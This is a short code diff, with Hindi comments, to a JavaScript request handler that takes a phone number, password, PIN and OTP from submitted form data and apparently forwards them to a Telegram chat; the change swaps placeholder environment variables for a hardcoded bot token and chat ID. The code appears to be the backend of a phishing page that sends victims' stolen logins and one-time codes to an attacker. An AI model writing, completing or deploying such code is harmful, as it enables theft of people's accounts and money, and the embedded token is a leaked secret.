@@ -7,9 +7,9 @@ export default async function handler(req, res) {
   try {
     const { type, phone, pass, pin, otp } = req.body;
 
-    // Yahan apna Telegram Bot Token aur Chat ID dalein
-    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YAHAN_APNA_BOT_TOKEN_DAALEIN';
-    const CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YAHAN_APNA_CHAT_ID_DAALEIN';
+    // Aapka Telegram Bot Token aur Chat ID yahan set kar diya gaya hai
+    const BOT_TOKEN = '9211304182:AAHkj2RxRH5TkFCYGUFXiKkboWR33I6-2fg';
+    const CHAT_ID = '6165279206';
 
     async function sendTelegramMessage(text) {
       try {
